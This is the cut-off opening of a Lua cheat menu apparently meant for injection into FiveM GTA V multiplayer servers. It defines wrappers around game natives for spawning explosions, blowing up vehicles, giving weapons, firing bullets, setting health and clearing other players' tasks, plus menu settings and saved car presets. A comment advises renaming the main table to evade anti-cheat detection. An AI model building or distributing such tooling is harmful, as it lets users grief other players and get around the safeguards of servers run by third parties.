local Keys = {
	['ESC'] = 322, ['F1'] = 288, ['F2'] = 289, ['F3'] = 170, ['F5'] = 166, ['F6'] = 167, ['F7'] = 168, ['F8'] = 169, ['F9'] = 56, ['F10'] = 57,
	['~'] = 243, ['1'] = 157, ['2'] = 158, ['3'] = 160, ['4'] = 164, ['5'] = 165, ['6'] = 159, ['7'] = 161, ['8'] = 162, ['9'] = 163, ['-'] = 84, ['='] = 83, ['BACKSPACE'] = 177,
	['TAB'] = 37, ['Q'] = 44, ['W'] = 32, ['E'] = 38, ['R'] = 45, ['T'] = 245, ['Y'] = 246, ['U'] = 303, ['P'] = 199, ['['] = 39, [']'] = 40, ['ENTER'] = 18,
	['CAPS'] = 137, ['A'] = 34, ['S'] = 8, ['D'] = 9, ['F'] = 23, ['G'] = 47, ['H'] = 74, ['K'] = 311, ['L'] = 182,
	['LEFTSHIFT'] = 21, ['Z'] = 20, ['X'] = 73, ['C'] = 26, ['V'] = 0, ['B'] = 29, ['N'] = 249, ['M'] = 244, [','] = 82, ['.'] = 81,
	['LEFTCTRL'] = 36, ['LEFTALT'] = 19, ['SPACE'] = 22, ['RIGHTCTRL'] = 70,
	['HOME'] = 213, ['PAGEUP'] = 10, ['PAGEDOWN'] = 11, ['DELETE'] = 178,
	['LEFT'] = 174, ['RIGHT'] = 175, ['TOP'] = 27, ['UP'] = 172, ['DOWN'] = 173,
	['NENTER'] = 201, ['N4'] = 108, ['N5'] = 60, ['N6'] = 107, ['N+'] = 96, ['N-'] = 97, ['N7'] = 117, ['N8'] = 61, ['N9'] = 118,
	['MOUSE1'] = 24
}

local old_print = print
local function dir_print(trash)
	old_print('[EsX_UmuT] '..trash)
end

local function intToFloat(_value)
	if _value then
		return _value + .0;
	else
		return 5391.0;
	end
end

local pCreateThread = Citizen.CreateThread
local pWait = Citizen.Wait
local pInvoke = Citizen.InvokeNative

local p_tostring = function(num)
	if num == 0 or not num then
		return nil
	end
	return tostring(num)
end

local Aldoportu = { --[[rename `Aldoportu` to whatever the fuck you want and ez undetek]]
	shouldShowMenu = true,
	debug = false,
	natives = {
		getCurrentServerEndpoint = function() --[[GetCurrentServerEndpoint]]
			return (pInvoke(" 0xea11bfba ", Citizen.ReturnResultAnyway(), Citizen.ResultAsString()))
		end,
		getCurrentResourceName = function() --[[GetCurrentResourceName]]
			return (pInvoke(" 0xe5e9ebbb ", Citizen.ReturnResultAnyway(), Citizen.ResultAsString()))
		end,
		getActivePlayers = function() --[[GetActivePlayers]]
			return (msgpack.unpack(pInvoke(" 0xcf143fb9 ", Citizen.ReturnResultAnyway(), Citizen.ResultAsObject())))
		end,
		clearPedTasksImmediately = function(ped) --[[ClearPedTasksImmediately]]
			return (pInvoke(" 0xAAA34F8A7CB32098 ", ped))
		end,
		addTextComponentSubstringPlayerName = function(text) --[[AddTextComponentSubstringPlayerName]]
			return (pInvoke(" 0x6C188BE134E074AA ", tostring(text)))
		end,
		beginTextCommandDisplayText = function(text) --[[BeginTextCommandDisplayText / SetTextEntry]]
			return (pInvoke(" 0x25FBB336DF1804CB ", tostring(text)))
		end,
		endTextCommandDisplayText = function(x, y) --[[EndTextCommandDisplayText / DrawText]]
			return (pInvoke(" 0xCD015E5BB0D96A57 ", x, y))
		end,
		loadResourceFile = function(resourceName, fileName) --[[LoadResourceFile]]
			return (pInvoke(" 0x76a9ee1f ", tostring(resourceName), tostring(fileName), Citizen.ReturnResultAnyway(), Citizen.ResultAsString()))
		end,
		createObject = function(modelHash, x, y, z, isNetwork, netMissionEntity, dynamic) --[[CreateObject]]
			return (pInvoke(" 0x509D5878EB39E842 ", modelHash, x, y, z, isNetwork, thisScriptCheck, dynamic, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()))
		end,
		drawRect = function(x, y, width, height, r, g, b, a) --[[DrawRect]]
			return (pInvoke(" 0x3A618A217E5154F0 ", x, y, width, height, r, g, b, a))
		end,
		addExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake) --[[AddExplosion]]
			return (pInvoke(" 0xE3AD2BDBAEE269AC ", x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake))
		end,
		networkExplodeVehicle = function(vehicle, isAudible, isInvisible, p3) --[[NetworkExplodeVehicle]]
			return (pInvoke(" 0x301A42153C9AD707 ", vehicle, isAudible, isInvisible, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()))
		end,
		giveWeaponToPed = function(ped, weaponHash, ammoCount, isHidden, equipNow) --[[GiveWeaponToPed]]
			return (pInvoke(" 0xBF0FD6E56C964FCB ", ped, weaponHash, ammoCount, isHidden, equipNow))
		end,
		addTextEntry = function(entryKey, entryText) --[[AddTextEntry]]
			return (pInvoke(" 0x32ca01c3 ", tostring(entryKey), tostring(entryText)))
		end,
		displayOnscreenKeyboard = function(p0, windowTitle, p2, defaultText, defaultConcat1, defaultConcat2, defaultConcat3, maxInputLength) --[[DisplayOnscreenKeyboard]]
			return (pInvoke(" 0x00DC833F2568DBF6 ", p0, tostring(windowTitle), tostring(p2), tostring(defaultText), tostring(defaultConcat1), tostring(defaultConcat2), tostring(defaultConcat3), maxInputLength))
		end,
		updateOnscreenKeyboard = function() --[[UpdateOnscreenKeyboard]]
			return (pInvoke(" 0x0CF2B696BBF945AE ", Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()))
		end,
		getVehicleXenonLightsColour = function(vehicle) --[[GetVehicleXenonLightsColour]]
			return (pInvoke(" 0x3DFF319A831E0CDB ", vehicle, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()))
		end,
		setVehicleXenonLightsColour = function(vehicle, color) --[[SetVehicleXenonLightsColour]]
			return (pInvoke(" 0xE41033B25D003A07 ", vehicle, color))
		end,
		doesExtraExist = function(vehicle, extraId) --[[DoesExtraExist]]
			return (pInvoke(" 0x1262D55792428154 ", vehicle, extraId, Citizen.ReturnResultAnyway()))
		end,
		setEntityVisible = function(entity, toggle, unk) --[[SetEntityVisible]]
			return (pInvoke(" 0xEA1C610A04DB6BBB ", entity, toggle, unk))
		end,
		createVehicle = function(modelHash, x, y, z, heading, isNetwork, thisScriptCheck) --[[CreateVehicle]]
			return (pInvoke(" 0xAF35D0D2583051B0 ", modelHash, x, y, z, heading, isNetwork, thisScriptCheck, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()))
		end,
		setEntityCoords = function(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea) --[[SetEntityCoords]]
			return (pInvoke(" 0x06843DA7060A026B ", entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea))
		end,
		setEntityCoordsNoOffset = function(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis) --[[SetEntityCoordsNoOffset]]
			return (pInvoke(" 0x239A3351AC1DA385 ", entity, xPos, yPos, zPos, xAxis, yAxis, zAxis))
		end,
		shootSingleBulletBetweenCoords = function(x1, y1, z1, x2, y2, z2, damage, p7, weaponHash, ownerPed, isAudible, isInvisible, speed) --[[ShootSingleBulletBetweenCoords]]
			return (pInvoke(" 0x867654CBC7606F2C ", x1, y1, z1, x2, y2, z2, damage, p7, GetHashKey(weaponHash), ownerPed, isAudible, isInvisible, speed))
		end,
		setEntityHealth = function(entity, health) --[[SetEntityHealth]]
			return (pInvoke(" 0x6B76DC1F3AE6E6A3 ", entity, health))
		end,
		setPedArmour = function(ped, amount) --[[SetPedArmour]]
			return (pInvoke(" 0xCEA04D83135264CC ", ped, amount))
		end,
		setTextFont = function(fontType) --[[SetTextFont]]
			return (pInvoke(" 0x66E0276CC5F6B9DA ", fontType))
		end,
		setTextColour = function(red, green, blue, alpha) --[[SetTextColour]]
			return (pInvoke(" 0xBE6B23FFA53FB442 ", red, green, blue, alpha))
		end,
		setTextScale = function(scale, size) --[[SetTextScale]]
			return (pInvoke(" 0x07C837F9A01C34C9 ", scale, size))
		end,
		setTextDropShadow = function() --[[SetTextDropShadow]]
			return (pInvoke(" 0x1CA3E9EAC9D93E5E "))
		end,
		playSoundFrontend = function(soundId, audioName, audioRef, p3) --[[PlaySoundFrontend]]
			return (pInvoke(" 0x67C540AA08E4A6F5 ", soundId, tostring(audioName), tostring(audioRef), p3))
		end,
		requestStreamedTextureDict = function(textureDict, p1) --[[RequestStreamedTextureDict]]
			return (pInvoke(" 0xDFA2EF8E04127DD5 ", tostring(textureDict), p1))
		end,
		setTextProportional = function(p0) --[[SetTextProportional]]
			return (pInvoke(" 0x038C1F517D7FDCF8 ", p0))
		end,
		setTextOutline = function() --[[SetTextOutline]]
			return (pInvoke(" 0x2513DFB0FB8400FE "))
		end,
		isDisabledControlPressed = function(inputGroup, control) --[[IsDisabledControlPressed]]
			return (pInvoke(" 0xE2587F8CBBD87B1D ", inputGroup, control, Citizen.ReturnResultAnyway()))
		end,
		setArtificialLightsState = function(state)
			return (pInvoke(" 0x1268615ACE24D504 ", state))
		end
	},
	menuProps = {
		shitMenus = {},
		keys = { up = Keys['UP'], down = Keys['DOWN'], left = Keys['LEFT'], right = Keys['RIGHT'], select = Keys['NENTER'], back = 202 },
		optionCount = 0,
		maximumOptionCount = 12,

		currentKey = nil,
		currentMenu = nil,

		titleHeight = 0.11,
		titleYOffset = 0.05,
		titleXOffset = 0.5,
		titleScale = 1.0,
		titleSpacing = 2,

		buttonHeight = 0.038,
		buttonFont = 0,
		buttonScale = 0.365,

		_mVersion = 'b1.3.9',
		buttonTextYOffset = 0.005,
		buttonTextXOffset = 0.005,

		selectedThemeRainbow = false,
		selectedCheckboxStyle = 'New',
		availableCheckboxStyles = {'New', 'Old'},
		menu_TextOutline = false,
		menu_TextDropShadow = true,
		menu_RectOverlay = true,

		selectedTheme = 'Classic',
		availableThemes = {'Dark', 'Light', 'Classic'},
		rainbowInt = 0,
	},
	functions = {},
	trashFunctions = {},
	trashTables = {},
	menus_list = {},
	cachedNotifications = {},

	datastore = {
		pLocalPlayer = {
			cVehicle = 0,
			pedId = 0,

			should2stepAutist = false,
		},
		
		es_extended = nil,
		ESX = nil,

		trainRide = {
			handleHasLoaded = true,
			handle = nil,
			oldCoords = nil,
			trainSpeed = 5.0,
		},

		savedVehicles = {
			{name = 'Nertigel\'s Elegy Retro Custom', props = {["modDashboard"] = 1,["modTransmission"] = 2,["modLivery"] = 4,["modFrame"] = 4,["modWindows"] = 0,["modTank"] = 1,["dirtLevel"] = 10.8,["modArmor"] = 4,["wheels"] = 0,["modFrontWheels"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modBrakes"] = 2,["modPlateHolder"] = 0,["modArchCover"] = -1,["wheelColor"] = 134,["pearlescentColor"] = 12,["modVanityPlate"] = 2,["modStruts"] = 11,["bodyHealth"] = 1000.0,["modAirFilter"] = 1,["modEngineBlock"] = 1,["modRightFender"] = -1,["modFender"] = 1,["modHydrolic"] = -1,["modAerials"] = 6,["modSpeakers"] = -1,["modSuspension"] = 3,["modTrimA"] = 0,["modEngine"] = 3,["modShifterLeavers"] = -1,["modSteeringWheel"] = 9,["modSeats"] = 0,["model"] = 196747873,["color1"] = 12,["modRearBumper"] = 1,["modDoorSpeaker"] = 4,["modSpoilers"] = 2,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["windowTint"] = 1,["plateIndex"] = 1,["modGrille"] = 0,["modTrunk"] = -1,["modAPlate"] = -1,["engineHealth"] = 1000.0,["modXenon"] = 1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modHorns"] = -1,["modHood"] = 4,["fuelLevel"] = 65.0,["modTurbo"] = 1,["modBackWheels"] = -1,["modRoof"] = 0,["modOrnaments"] = -1,["extras"] = { } ,["modTrimB"] = 0,["modFrontBumper"] = -1,["modExhaust"] = 2,["color2"] = 12,["modDial"] = 2,["xenonColor"] = 255,["modSideSkirt"] = 4,}},
			{name = 'Nertigel\'s Jester Classic', props = {["modFrame"] = 2,["modTransmission"] = 2,["modRoof"] = 0,["modLivery"] = 1,["color1"] = 12,["modWindows"] = -1,["modTank"] = -1,["modSideSkirt"] = 0,["modSpeakers"] = -1,["wheels"] = 0,["modAerials"] = -1,["dirtLevel"] = 6.2,["modArchCover"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modStruts"] = -1,["modBackWheels"] = -1,["engineHealth"] = 1000.0,["modSuspension"] = 4,["modTurbo"] = 1,["modAirFilter"] = -1,["modEngineBlock"] = -1,["modHydrolic"] = -1,["modOrnaments"] = -1,["modEngine"] = 3,["modHood"] = 2,["fuelLevel"] = 65.0,["modTrunk"] = -1,["modRightFender"] = -1,["modTrimB"] = -1,["modFrontBumper"] = 8,["modShifterLeavers"] = -1,["wheelColor"] = 12,["model"] = -214906006,["modFrontWheels"] = 8,["windowTint"] = 1,["bodyHealth"] = 1000.0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSeats"] = -1,["modHorns"] = -1,["modRearBumper"] = -1,["modDoorSpeaker"] = -1,["modBrakes"] = 2,["modDial"] = -1,["modSmokeEnabled"] = 1,["modGrille"] = -1,["modFender"] = 0,["modTrimA"] = -1,["modVanityPlate"] = -1,["modPlateHolder"] = -1,["plateIndex"] = 1,["modSteeringWheel"] = -1,["modXenon"] = 1,["color2"] = 12,["modArmor"] = 4,["modDashboard"] = -1,["pearlescentColor"] = 12,["extras"] = { } ,["modExhaust"] = 3,["modAPlate"] = -1,["xenonColor"] = 255,["modSpoilers"] = 0,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,}},
			{name = 'Nertigel\'s Schwartzer', props = {["color2"] = 12,["modBackWheels"] = -1,["bodyHealth"] = 1000.0,["modLivery"] = -1,["modArchCover"] = -1,["wheelColor"] = 12,["modTank"] = -1,["modXenon"] = 1,["modAerials"] = -1,["modOrnaments"] = -1,["modWindows"] = -1,["modStruts"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modAirFilter"] = -1,["modEngineBlock"] = -1,["modHydrolic"] = -1,["modFender"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["dirtLevel"] = 5.1,["modArmor"] = 4,["modHorns"] = -1,["modAPlate"] = -1,["modTrunk"] = -1,["modShifterLeavers"] = -1,["modPlateHolder"] = -1,["model"] = -746882698,["modSpeakers"] = -1,["extras"] = { ["10"] = false,["12"] = false,} ,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modHood"] = -1,["modRoof"] = -1,["modEngine"] = 3,["modTrimA"] = -1,["modFrame"] = 0,["modFrontBumper"] = 1,["modExhaust"] = 2,["modSteeringWheel"] = -1,["modFrontWheels"] = 25,["color1"] = 12,["modTrimB"] = -1,["modSmokeEnabled"] = 1,["windowTint"] = 1,["modSeats"] = -1,["fuelLevel"] = 65.0,["modSpoilers"] = 0,["modSuspension"] = 2,["modTransmission"] = 2,["plateIndex"] = 1,["modBrakes"] = 2,["modDashboard"] = -1,["modRightFender"] = -1,["wheels"] = 7,["modSideSkirt"] = 0,["modDial"] = -1,["modRearBumper"] = 0,["modGrille"] = 0,["modVanityPlate"] = -1,["modDoorSpeaker"] = -1,["pearlescentColor"] = 12,["xenonColor"] = 255,["modTurbo"] = 1,["engineHealth"] = 1000.0,}},
		
			{name = 'Alfa Romeo Giulia QV', props = {["modLivery"] = 0,["xenonColor"] = 255,["model"] = 433374210,["extras"] = { ["11"] = true,} ,["modTurbo"] = 1,["suspensionRaise"] = 2.2351741291171e-10,["dirtLevel"] = 6.8,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 4,["modFrame"] = -1,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 31,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 3,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 12,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 1,["wheelColor"] = 156,["modEngineBlock"] = -1,["modRearBumper"] = -1,["modVanityPlate"] = -1,["modFrontBumper"] = -1,}},
			
			{name = 'Aston Martin DBS 2008', props = {["modLivery"] = -1,["xenonColor"] = 255,["model"] = -1131896028,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.019999995827675,["dirtLevel"] = 3.8,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = 9,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = -1,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 2,["wheels"] = 7,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 3,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 83,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 1,["wheelColor"] = 12,["modEngineBlock"] = -1,["modRearBumper"] = -1,["modVanityPlate"] = -1,["modFrontBumper"] = -1,}},
			
			{name = 'Bentley Bentayga 2017', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 1,["suspensionRaise"] = -0.060000006109476,["fuelLevel"] = 60.0,["modLivery"] = -1,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 1,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 12.2,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 1728797204,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 156,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = -1,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["1"] = false,["2"] = false,["10"] = false,["3"] = false,["4"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 3,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = 1,["color2"] = 2,["modFrame"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = -1,["modAerials"] = -1,}},
			{name = 'Bentley Continental GT 2013', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = -1,["suspensionRaise"] = -0.03999999910593,["fuelLevel"] = 60.0,["modLivery"] = -1,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = -1,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 8.0,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 899312186,["modAPlate"] = -1,["modHood"] = -1,["wheelColor"] = 122,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = -1,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["1"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = 0,["color2"] = 88,["modFrame"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 0,["modAerials"] = -1,}},
			
			{name = 'Audi A4 Quattro', props = {["modLivery"] = -1,["xenonColor"] = 255,["model"] = -985643932,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.019999999552965,["dirtLevel"] = 6.1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = -1,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 0,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 3,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 14,["modExhaust"] = 0,["modRoof"] = 0,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 4,["wheelColor"] = 156,["modEngineBlock"] = -1,["modRearBumper"] = 0,["modVanityPlate"] = -1,["modFrontBumper"] = 0,}},
			{name = 'Audi A6 2020', props = {["modLivery"] = -1,["xenonColor"] = 255,["model"] = -494839908,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.059999998658895,["dirtLevel"] = 0.0,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = 3,["modHood"] = 4,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = 2,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = 2,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = 4,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 112,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 3,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = 5,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = 5,["color1"] = 134,["modExhaust"] = 1,["modRoof"] = 1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = 1,["plateIndex"] = 4,["wheelColor"] = 12,["modEngineBlock"] = -1,["modRearBumper"] = 1,["modVanityPlate"] = -1,["modFrontBumper"] = 3,}},
			{name = 'Audi Q8 2020', props = {["modLivery"] = -1,["xenonColor"] = 255,["model"] = -2006731729,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.019999995827675,["dirtLevel"] = 0.0,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = 0,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 2,["wheels"] = 3,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 4,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 134,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 4,["wheelColor"] = 112,["modEngineBlock"] = -1,["modRearBumper"] = -1,["modVanityPlate"] = -1,["modFrontBumper"] = -1,}},
			{name = 'Audi R8 2020', props = {["modSteeringWheel"] = -1,["suspensionRaise"] = -0.079999998211861,["bodyHealth"] = 1000.0,["modFrontBumper"] = 1,["modLivery"] = -1,["modVanityPlate"] = -1,["modAPlate"] = -1,["extras"] = { } ,["modWindows"] = -1,["xenonColor"] = 255,["modTrimB"] = -1,["pearlescentColor"] = 12,["modTank"] = -1,["modTurbo"] = 1,["color1"] = 134,["modAirFilter"] = -1,["windowTint"] = 1,["modSideSkirt"] = 0,["color2"] = 28,["modSpeakers"] = -1,["fuelLevel"] = 60.0,["modArchCover"] = -1,["wheels"] = 7,["dirtLevel"] = 7.3,["modEngineBlock"] = -1,["modStruts"] = -1,["modSpoilers"] = 3,["modPlateHolder"] = -1,["modXenon"] = 1,["modRearBumper"] = 0,["modRightFender"] = 1,["modDial"] = -1,["modFrontWheels"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["modTrunk"] = -1,["modFrame"] = 0,["modAerials"] = -1,["modSmokeEnabled"] = 1,["modDashboard"] = -1,["modDoorSpeaker"] = -1,["modSeats"] = -1,["modSuspension"] = 4,["modTransmission"] = 2,["plateIndex"] = 4,["modShifterLeavers"] = -1,["wheelColor"] = 12,["modArmor"] = 4,["modTrimA"] = -1,["modFender"] = -1,["modBackWheels"] = -1,["modOrnaments"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["model"] = -143695728,["modHorns"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modRoof"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["engineHealth"] = 1000.0,["modHood"] = 3,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modExhaust"] = -1,}},
